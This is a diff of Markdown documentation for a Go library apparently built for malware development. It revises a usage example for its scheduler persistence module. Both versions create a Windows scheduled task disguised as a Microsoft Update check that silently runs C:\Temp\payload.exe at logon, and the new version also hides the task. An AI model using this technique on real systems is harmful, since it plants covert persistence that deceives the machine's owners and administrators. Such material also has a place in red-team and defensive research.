@@ -45,16 +45,15 @@ sequenceDiagram
 ```go
 import "github.com/oioio-space/maldev/persistence/scheduler"
 
-err := scheduler.Create(ctx, &scheduler.Task{
-    Name:    `Microsoft\Windows\Update\Check`,
-    Command: `C:\Temp\payload.exe`,
-    Args:    "--silent",
-    Trigger: scheduler.TriggerLogon,
-})
+err := scheduler.Create(`\Microsoft\Windows\Update\Check`,
+    scheduler.WithAction(`C:\Temp\payload.exe`, "--silent"),
+    scheduler.WithTriggerLogon(),
+    scheduler.WithHidden(),
+)
 
-exists := scheduler.Exists(ctx, `Microsoft\Windows\Update\Check`)
+found, _ := scheduler.Exists(`\Microsoft\Windows\Update\Check`)
 
-err = scheduler.Delete(ctx, `Microsoft\Windows\Update\Check`)
+err = scheduler.Delete(`\Microsoft\Windows\Update\Check`)
 ```
 
 ---
